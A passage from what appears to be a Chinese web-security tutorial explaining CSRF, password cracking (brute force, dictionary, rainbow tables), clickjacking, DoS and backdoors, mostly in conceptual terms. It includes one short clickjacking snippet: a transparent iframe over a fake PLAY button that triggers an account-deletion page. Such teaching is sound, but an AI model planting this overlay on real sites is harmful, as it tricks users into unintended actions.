&emsp;&emsp;下面以留言板功能为例，讲解跨站点请求伪造。该功能只允许已认证并登录的用户在留言板上发表内容

![webAttack29](https://pic.xiaohuochai.site/blog/HTTP_webAttack29.png)

&emsp;&emsp;在该留言板系统上，受害者用户A是已认证状态。它的浏览器中的Cookie持有已认证的会话ID(步骤①)

&emsp;&emsp;攻击者设置好一旦用户访问，即会发送在留言板上发表非主观行为产生的评论的请求的陷阱。用户A的浏览器执行完陷阱中的请求后，留言板上也就会留下那条评论(步骤②)

&emsp;&emsp;触发陷阱之际，如果用户A尚未通过认证，则无法利用用户A的身份权限在留言板上发表内容

&nbsp;

### 其他安全漏洞

【密码破解】

&emsp;&emsp;密码破解攻击(Password Cracking)即算出密码，突破认证。攻击不仅限于Web应用，还包括其他的系统(如FTP或SSH等)，本节将会讲解对具备认证功能的Web应用进行的密码破解

&emsp;&emsp;密码破解有以下两种手段：通过网络的密码试错；对已加密密码的破解(指攻击者入侵系统，已获得加密或散列处理的密码数据的情况)

&emsp;&emsp;除去突破认证的攻击手段，还有SQL注入攻击逃避认证，跨站脚本攻击窃取密码信息等方法

**通过网络进行密码试错**

&emsp;&emsp;对Web应用提供的认证功能，通过网络尝试候选密码进行的一种攻击。包括以下两种方式：穷举法和字典攻击

&emsp;&emsp;穷举法(Brute-force Attack，又称暴力破解法)是指对所有密钥集合构成的 密钥空间(Keyspace)进行穷举。即，用所有可行的候选密码对目标的密码系统试错，用以突破验证的一种攻击

比如银行采用的个人识别码是由&ldquo;4位数字&rdquo;组成的密码，那么就要从0000~9999中的全部数字逐个进行尝试。这样一来，必定在候选的密码集合中存在一个正确的密码，可通过认证

&emsp;&emsp;因为穷举法会尝试所有的候选密码，所以是一种必然能够破解密码的攻击。但是，当密钥空间很庞大时，解密可能需要花费数年，甚至千年的时间，因此从现实角度考量，攻击是失败的

&emsp;&emsp;字典攻击是指利用事先收集好的候选密码(经过各种组合方式后存入字典)，枚举字典中的密码，尝试通过认证的一种攻击手法

&emsp;&emsp;还是举银行采用个人识别码是&ldquo;4位数字&rdquo;的密码的例子，考虑到用户使用自己的生日做密码的可能性较高，于是就可以把生日日期数值化，如将0101~1231保存成字典，进行尝试

&emsp;&emsp;与穷举法相比，由于需要尝试的候选密码较少，意味着攻击耗费的时间比较短。但是，如果字典中没有正确的密码，那就无法破解成功。因此攻击的成败取决于字典的内容

![webAttack30](https://pic.xiaohuochai.site/blog/HTTP_webAttack30.png)

&emsp;&emsp;字典攻击中有一种利用其他Web网站已泄露的ID及密码列表进行的攻击。很多用户习惯随意地在多个Web网站使用同一套ID及密码，因此攻击会有相当高的成功几率

**对已加密密码的破解**

&emsp;&emsp;Web应用在保存密码时，一般不会直接以明文的方式保存，通过散列函数做散列处理或加salt的手段对要保存的密码本身加密。那即使攻击者使用某些手段窃取密码数据，如果想要真正使用这些密码，则必须先通过解码等手段，把加密处理的密码还原成明文形式

![webAttack31](https://pic.xiaohuochai.site/blog/HTTP_webAttack31.png)

&emsp;&emsp;从加密过的数据中导出明文通常有以下几种方法：通过穷举法&middot;字典攻击进行类推；彩虹表；拿到密钥；加密算法的漏洞

1、通过穷举法&middot;字典攻击进行类推

&emsp;&emsp;针对密码使用散列函数进行加密处理的情况，采用和穷举法或字典攻击相同的手法，尝试调用相同的散列函数加密候选密码，然后把计算出的散列值与目标散列值匹配，类推出密码

![webAttack32](https://pic.xiaohuochai.site/blog/HTTP_webAttack32.png)

2、彩虹表

&emsp;&emsp;彩虹表(Rainbow Table)是由明文密码及与之对应的散列值构成的一张数据 库表，是一种通过事先制作庞大的彩虹表，可在穷举法&middot;字典攻击等实际破解过程中缩短消耗时间的技巧。从彩虹表内搜索散列值就可以推导出对应的明文密码

![webAttack33](https://pic.xiaohuochai.site/blog/HTTP_webAttack33.png)

&emsp;&emsp;为了提高攻击成功率，拥有一张海量数据的彩虹表就成了必不可少的条件。例如在Free Rainbow Tables 网站上(`http://www.freerainbowtables.com/en/tables2/`)公布的一张由大小写字母及数字全排列的1~8位字符串对应的MD5散列值构成的彩虹表，其大小约为1050吉字节

3、拿到密钥

&emsp;&emsp;使用共享密钥加密方式对密码数据进行加密处理的情况下，如果能通过某种手段拿到加密使用的密钥，也就可以对密码数据解密了

4、加密算法的漏洞

&emsp;&emsp;考虑到加密算法本身可能存在的漏洞，利用该漏洞尝试解密也是一种可行的方法。但是要找到那些已广泛使用的加密算法的漏洞，又谈何容易，因此困 难极大，不易成功

&emsp;&emsp;而Web应用开发者独立实现的加密算法，想必尚未经过充分的验证，还是 很有可能存在漏洞的

【点击劫持】

&emsp;&emsp;点击劫持(Click jack ing)是指利用透明的按钮或链接做成陷阱，覆盖在Web页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装(UI Redressing)

&emsp;&emsp;已设置陷阱的Web页面，表面上内容并无不妥，但早已埋入想让用户点击的链接。当用户点击到透明的按钮时，实际上是点击了已指定透明属性元素的iframe页面

**点击劫持的攻击案例**

&emsp;&emsp;下面以SNS网站的注销功能为例，讲解点击劫持攻击。利用该注销功能，注册登录的SNS用户只需点击注销按钮，就可以从SNS网站上注销自己的会员身份

![webAttack34](https://pic.xiaohuochai.site/blog/HTTP_webAttack34.png)

&emsp;&emsp;攻击者在预料用户会点击的Web页面上设下陷阱。上图中钓鱼游戏页面上的PLAY按钮就是这类陷阱的实例

&emsp;&emsp;在做过手脚的Web页面上，目标的SNS注销功能页面将作为透明层覆盖在游戏网页上。覆盖时，要保证PLAY按钮与注销按钮的页面所在位置保持一致

&emsp;&emsp;iframe页面中使用透明可点击按钮的示例

<div>
<pre>&lt;iframe id="target" src="http://sns.example.jp/leave" style="opacity:0;filter:alpha(opacity=0);"&gt;&lt;/iframe&gt;
&lt;button style="position: absolute;top:100;left:100;z-index:-1;"&gt;PLAY&lt;/button&gt;</pre>
</div>

&emsp;&emsp;由于SNS网站作为透明层被覆盖，SNS网站上处于登录状态的用户访问这个钓鱼网站并点击页面上的PLAY按钮之后，等同于点击了SNS网站的注销按钮

【DoS攻击】

&emsp;&emsp;DoS 攻击(Denial of Serv ice attack)是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS攻击的对象不仅限于Web网站，还包括网络设备及服务器等

&emsp;&emsp;主要有以下两种DoS攻击方式：集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态；通过攻击安全漏洞使服务停止

&emsp;&emsp;其中，集中利用访问请求的DoS攻击，单纯来讲就是发送大量的合法请求。服务器很难分辨何为正常请求，何为攻击请求，因此很难防止DoS攻击

![webAttack35](https://pic.xiaohuochai.site/blog/HTTP_webAttack35.png)

&emsp;&emsp;多台计算机发起的DoS攻击称为DDoS攻击(Distributed Denial of Serv ice attack)。DDoS攻击通常利用那些感染病毒的计算机作为攻击者的攻击跳板

【后门程序】

&emsp;&emsp;后门程序(Backdoor)是指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后门程序就能够使用原本受限制的功能

&emsp;&emsp;通常的后门程序分为以下3种类型：开发阶段作为Debug调用的后门程序；开发者为了自身利益植入的后门程序；攻击者通过某种方法设置的后门程序

&emsp;&emsp;可通过监视进程和通信的状态发现被植入的后门程序。但设定在Web应用中的后门程序，由于和正常使用时区别不大，通常很难发现

